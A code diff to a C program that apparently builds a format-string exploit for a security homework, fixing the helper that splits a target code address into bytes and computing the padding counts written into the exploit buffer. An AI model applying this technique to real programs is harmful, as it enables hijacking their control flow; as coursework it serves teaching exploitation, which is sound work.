@@ -105,9 +105,9 @@ void create_subproc(const char* exec, char* argv[]) {
    }
 }
 
-/* Convert a two byte hex value to decimal */
-int convert_hex(unsigned hex) {
-   return (hex & 0xf) + (hex & 0xf0);
+/* Extract the least significant byte from an integer */
+int extract_lsb(unsigned val) {
+   return val & 0xff;
 }
 
 /* Round a number to the nearest multiple of 256 >= to it */
@@ -187,19 +187,19 @@ int main(int argc, char* argv[]) {
 
    // Compute Ci/Bi as defined in the homework solution
    unsigned printed = 0, c1 = 256;
-   unsigned b1 = convert_hex(code_addr);
+   unsigned b1 = extract_lsb(code_addr);
    printed += c1 + b1;
    
    unsigned c2 = round_256(printed) - printed;
-   unsigned b2 = convert_hex(code_addr >> 8);
+   unsigned b2 = extract_lsb(code_addr >> 8);
    printed += c2 + b2;
 
    unsigned c3 = round_256(printed) - printed;
-   unsigned b3 = convert_hex(code_addr >> 16);
+   unsigned b3 = extract_lsb(code_addr >> 16);
    printed += c3 + b3;
 
    unsigned c4 = round_256(printed) - printed;
-   unsigned b4 = convert_hex(code_addr >> 24);
+   unsigned b4 = extract_lsb(code_addr >> 24);
 
    // Populate "attack_format" part of exploit buffer
    sprintf((char*)exploit, attack_format, c1, b1, c2, b2, c3, b3, c4, b4);
